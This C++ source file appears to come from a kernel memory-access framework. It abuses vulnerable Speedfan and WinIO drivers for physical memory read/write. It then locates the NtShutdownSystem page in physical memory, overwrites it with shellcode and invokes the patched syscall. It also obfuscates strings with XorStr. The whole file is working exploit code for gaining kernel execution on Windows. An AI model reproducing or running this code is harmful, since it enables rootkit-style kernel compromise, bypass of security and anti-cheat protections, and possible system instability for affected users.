#include "dm.h"
#include "dm_utils.hpp"
#include <cstdint>

HANDLE g_drv_handle = NULL;
BOOL(*g_write_phys)(void* addr, void* buffer, std::size_t size) = NULL;
BOOL(*g_read_phys)(void* addr, void* buffer, std::size_t size) = NULL;
void* g_syscall_address = NULL;

static void DM_LocateSyscall(std::uintptr_t address, std::uintptr_t length, uint32_t nt_rva, uint16_t nt_page_offset, uint8_t* ntoskrnl)
{
	static FARPROC proc = GetProcAddress(LoadLibraryA(SYSCALL_DLL), SYSCALL_HOOK);
	uint8_t* page_data = (uint8_t*)VirtualAlloc(
		nullptr,
		PAGE_4KB, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	//0:  48 29 c0                sub    rax, rax
	//3 : 48 83 c0 42             add    rax, 0x42
	//7 : 48 83 e8 42             sub    rax, 0x42
	//b : 90                      nop
	//c : c3                      ret
	uint8_t shellcode[] = { 0x48, 0x29, 0xC0, 0x48, 0x83, 0xC0, 0x42, 0x48, 0x83, 0xE8, 0x42, 0x90, 0xC3 };
	uint8_t orig_bytes[sizeof shellcode];

	for (auto page = 0u; page < length; page += PAGE_4KB)
	{
		if (g_syscall_address != NULL)
			break;
		if (address + page < 0x1000000)
			continue;
		if (!g_read_phys(reinterpret_cast<void*>(address + page), page_data, PAGE_4KB))
			continue;

		if (!memcmp(page_data + nt_page_offset, ntoskrnl + nt_rva, 32))
		{
			void* syscall_addr = reinterpret_cast<void*>(address + page + nt_page_offset);

			// save original bytes and install shellcode...
			g_read_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
			g_write_phys(syscall_addr, shellcode, sizeof shellcode);

			auto result = reinterpret_cast<long long int(__fastcall*)(void)>(proc)();
			g_write_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
			if (result == STATUS_SUCCESS) {
				g_syscall_address = reinterpret_cast<void*>(address + page + nt_page_offset);
			}
		}
	}
	VirtualFree(page_data, PAGE_4KB, MEM_DECOMMIT);
}

void DM_LoadFramework()
{
	char ntoskrnl_version_buffer[1024];

	if (g_syscall_address != NULL)
		return;

	uint32_t nt_rva;
	uint16_t nt_page_offset;
	uint8_t* ntoskrnl = reinterpret_cast<std::uint8_t*>(LoadLibraryExA(XorStr("ntoskrnl.exe"), NULL, DONT_RESOLVE_DLL_REFERENCES));

	switch (g_options->driver)
	{
		case DriverSpeedfan:
			g_read_phys = SPEEDFAN_read_phys;
			g_write_phys = SPEEDFAN_write_phys;
			g_drv_handle = SPEEDFAN_load_drv();
			break;
		case DriverWinIO:
			g_read_phys = WINIO_read_phys;
			g_write_phys = WINIO_write_phys;
			g_drv_handle = WINIO_load_drv();
			break;
		default:
			printf("[!] This shouldn't happen\n");
			exit(1);
	}

	DM_GetKrnlVersion(ntoskrnl_version_buffer, sizeof(ntoskrnl_version_buffer), XorStr("C:\\Windows\\System32\\ntoskrnl.exe"));
	(void)nt_rva;
	(void)nt_page_offset;
	(void)ntoskrnl;
	nt_rva = (uint32_t)(uintptr_t)DM_GetKernelExportAddress(0x00ULL, ntoskrnl_version_buffer, KE_NtShutdownSystem); // Yes that's weird, but I very much know what I'm doing here, stop complaining damn compiler
	nt_page_offset = nt_rva % PAGE_4KB;

	for (auto ranges : util::pmem_ranges)
	{
		DM_LocateSyscall(
			ranges.first,
			ranges.second,
			nt_rva,
			nt_page_offset,
			ntoskrnl
		);
	}
	printf("[+] Framework loaded, target physical address: 0x%llx\n", g_syscall_address);
}

